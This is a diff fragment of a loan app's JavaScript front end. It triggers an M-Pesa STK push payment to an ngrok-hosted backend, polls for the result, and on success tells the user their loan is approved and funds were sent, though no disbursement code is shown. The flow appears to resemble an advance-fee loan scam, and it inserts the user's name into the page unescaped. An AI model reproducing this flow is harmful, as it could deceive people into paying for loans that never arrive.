+            showStatus(`❌ ${err.message}`, "error");
+            return;
+        }
+
+        if (!amount || amount < 1) {
+            showStatus("❌ Please enter a valid amount", "error");
+            return;
+        }
+
+        btn.disabled = true;
+        btn.innerHTML = '<span class="small-spinner"></span> Sending STK Push...';
+        showStatus("STK Push sent.<br>Check your phone and enter M-Pesa PIN.", "info");
+
+        try {
+            const res = await fetch(`${BACKEND_URL}/api/stk-push`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                    "ngrok-skip-browser-warning": "true"
+                },
+                body: JSON.stringify({ 
+                    amount: amount, 
+                    phone_number: finalPhone 
+                })
+            });
+
+            const data = await res.json();
+
+            if (res.ok && (data.success || data.invoice)) {
+                startPolling();
+            } else {
+                showStatus("❌ Failed to start payment", "error");
+                resetButton();
+            }
+        } catch (err) {
+            showStatus("❌ Connection error.", "error");
+            resetButton();
+        }
+    }
+
+    function startPolling() {
+        let attempts = 0;
+        const maxAttempts = 50; 
+
+        if (pollTimer) clearInterval(pollTimer);
+
+        pollTimer = setInterval(async () => {
+            attempts++;
+
+            try {
+                const res = await fetch(`${BACKEND_URL}/api/status`, {
+                    headers: { "ngrok-skip-browser-warning": "true" }
+                });
+
+                const data = await res.json();
+
+                if (data.status === true && data.response) {
+                    const code = data.response.ResultCode;
+
+                    if (code === 0) {
+                        clearInterval(pollTimer);
+                        hideOverlays();
+                        document.getElementById('successDetails').innerHTML = `
+                            <p>${appState.name}, loan approved!</p>
+                            <p>Amount: Ksh ${appState.selectedLoan.toLocaleString()}</p>
+                            <p>Monthly: Ksh ${appState.monthly.toLocaleString()} for ${appState.tenureMonths} months</p>
+                            <p>Funds sent to ${appState.phone}</p>
+                        `;
+                        document.getElementById('successOverlay').classList.remove('hidden');
+                        return;
+                    }
+                    else if (code === 1032) {
+                        clearInterval(pollTimer);
+                        showStatus("❌ Payment was cancelled.<br>Please try again.", "error");
+                        resetButton();
+                        return;
+                    }
+                    else {
+                        clearInterval(pollTimer);
+                        let msg = data.response.ResultDesc || "Payment failed";
+                        if (code === 2001) msg = "Wrong M-Pesa PIN entered.";
+                        showStatus(`❌ ${msg}`, "error");
+                        resetButton();
+                        return;
+                    }
+                }
+
+                if (attempts >= maxAttempts) {
+                    clearInterval(pollTimer);
+                    showStatus("⏰ Request timed out.<br>Check your M-Pesa or try again.", "error");
+                    resetButton();
+                }
+            } catch (err) {
+                console.error("Polling error:", err);
+            }
+        }, 3000);
+    }
+
     document.getElementById('homeResetBtn').addEventListener('click', () => { hideOverlays(); showPage('homePage'); document.getElementById('applicationForm').reset(); appState = {}; });
     document.getElementById('homeStartBtn').addEventListener('click', () => showPage('applyPage'));
     document.getElementById('fabApplyBtn').addEventListener('click', () => showPage('applyPage'));
     document.querySelectorAll('.nav-btn').forEach(btn => btn.addEventListener('click', () => { const page = btn.dataset.page; if (page === 'home') { showPage('homePage'); hideOverlays(); } else { showPage('applyPage'); hideOverlays(); } }));
+    
     showPage('homePage');
 </script>
 </body>
